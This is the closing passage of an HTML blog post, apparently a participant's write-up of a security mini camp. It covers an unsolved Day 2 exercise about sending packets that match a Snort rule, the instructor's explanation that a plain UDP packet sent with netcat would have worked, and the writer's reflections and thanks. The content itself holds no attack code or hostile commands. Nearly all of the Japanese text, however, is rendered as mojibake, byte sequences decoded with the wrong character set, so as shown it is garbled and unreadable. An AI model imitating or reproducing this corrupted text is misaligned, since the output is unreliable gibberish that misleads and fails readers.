æ­£è¦è¡¨ç¾ã€OSS ã§å®Ÿè£…ãŒè¦‹ãˆã‚‹ã‚‚ã®ã«ã¤ã„ã¦ãƒã‚¤ãƒ‘ã‚¹ã•ã‚ŒãŒã¡ã¿ãŸã„ãªå°è±¡ãŒã‚ã‚‹ã®ã§ Regex Master ã«ãªã£ã¦å®‰å…¨ãªå®Ÿè£…ãŒã§ãã‚‹ã‚ˆã†ã«ãªã‚ŠãŸã„ã§ã™ã­ã€‚</p>
<h1 id=day2-ãƒãƒ«ã‚¦ã‚§ã‚¢ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ†ææ¤œçŸ¥ã—ã¦ã¿ã‚ˆã†-è§£ã‘ãªã‹ã£ãŸ>DAY2 ãƒãƒ«ã‚¦ã‚§ã‚¢ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ†æãƒ»æ¤œçŸ¥ã—ã¦ã¿ã‚ˆã† (è§£ã‘ãªã‹ã£ãŸ)</h1>
<p>snort ã®ãƒ«ãƒ¼ãƒ«ã«æ²¿ã£ãŸãƒ‘ã‚±ãƒƒãƒˆã‚’é€ã£ã¦ãã ã•ã„ã¨ã„ã†å•é¡Œã§ã—ãŸã€‚</p>
<h2 id=æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨-4>æ™‚é–“ä¸­ã«ã‚„ã£ãŸã“ã¨</h2>
<p>ã“ã‚Œ snort ä½¿ã£ã¦ãƒ‘ã‚±ãƒƒãƒˆé€ã‚Œã‚‹ã®ã‹ãªã€ã„ã‚„ã“ã‚Œãƒ­ã‚°åé›†ã‚½ãƒ•ãƒˆã§ã¯ï¼Ÿã§ã‚‚ snort ä½¿ã‚ãªã„ã¨è¬›ç¾©ç¿’ã£ãŸä¸Šã§ã®ã‚ã‚Œã§ã¯ãªã„ã—ãªã‚ã¨æ€ã£ã¦ snort ã‚’ä¸€ç”Ÿå‹•ã‹ã—ã¦ã„ã¾ã—ãŸã€‚ãƒ­ã‚°ã«ä½•ã‚‚è¨˜éŒ²ã•ã‚Œãšã€ãŠã‹ã—ã„ãªã‚ã¨æ€ã„ãªãŒã‚‰è‰²ã€…ã‚¬ãƒãƒ£ã‚¬ãƒãƒ£ã—ã¦ã„ã¾ã—ãŸã€‚ãŸã¶ã‚“ snort ã‚’ 1 æ™‚é–“ãã‚‰ã„ã¯è§¦ã£ã¦ã„ãŸã¨æ€ã„ã¾ã™&mldr;</p>
<h2 id=è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨-4>è¬›å¸«ã®æ–¹ã®è§£èª¬ã‚’è¦‹ã¦æ–°ã—ãçŸ¥ã£ãŸã“ã¨</h2>
<p>netcat ã‚’ä½¿ã£ã¦æ™®é€šã« UDP ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã™ã‚Œã°ã‚ˆã‹ã£ãŸã‚ˆã†ã§ã™ï¼ï¼ï¼snort ã¯ãŠãã‚‰ãè¬›å¸«å´ã§å‹•ã„ã¦ã„ã¦ãã‚Œã«åˆã†ãƒ‘ã‚±ãƒƒãƒˆã‚’é€ã£ã¦è¿”å´ã•ã‚ŒãŸã‚‚ã®ãŒãƒ•ãƒ©ãƒƒã‚°ã«ãªã£ã¦ã„ã‚‹ã¨ã„ã†ã‚‚ã®ã§ã—ãŸï¼ï¼ï¼ã‹ãªã—ã„ï¼ï¼ï¼</p>
<h1 id=æ„Ÿæƒ³>æ„Ÿæƒ³</h1>
<p>ãƒŸãƒ‹ã‚­ãƒ£ãƒ³ãƒ—ä¿®äº†ã§ããŸæ°—ãŒã—ãªãã¦å³ã—ã„æ°—æŒã¡ã«ãªã‚Šã¾ã—ãŸãŒã€æ¥½ã—ã‚ã¾ã—ãŸã€‚ã¨ã¦ã‚‚æ‚”ã—ã‹ã£ãŸã®ã§ã™ãŒãŠãã‚‰ãå¹´é½¢çš„ã«ä»Šå¹´ 25 ã§ãƒªãƒ™ãƒ³ã‚¸ã®æ©Ÿä¼šã¯ãªã•ãã†ãªã®ã§ã€è‹¦æ‰‹åˆ†é‡ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚‚ã€å¥½ããªåˆ†é‡ã®ä½ãƒ¬ã‚¤ãƒ¤ã‚‚ã‚³ãƒ„ã‚³ãƒ„ç²¾é€²ã—ã¦è¡ŒããŸã„ã¨æ€ã„ã¾ã™ã€‚<br>
è¬›å¸«é™£ã®ã¿ãªã•ã‚“ã€ã‚¤ãƒ³ãƒ•ãƒ©æä¾›ã‚’ã—ã¦ãã ã•ã£ãŸæ–¹ã€…ã€é‹å–¶äº‹å‹™ã®æ–¹ã€…ã€ã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸï¼</p>
</article>
<footer>
<p class=license>
This document is licensed under
<a href=https://creativecommons.org/licenses/by/4.0/ target=_blank rel="noopener noreferrer">CC-BY-4.0</a>
</p>
<p class=repository>
<a href=https://github.com/uta8a/discussion/discussions/1 target=_blank rel="noopener noreferrer">discussion</a>ã«ã‚³ãƒ¡ãƒ³ãƒˆã™ã‚‹
</p>
</footer>
</main>
</body>
</html>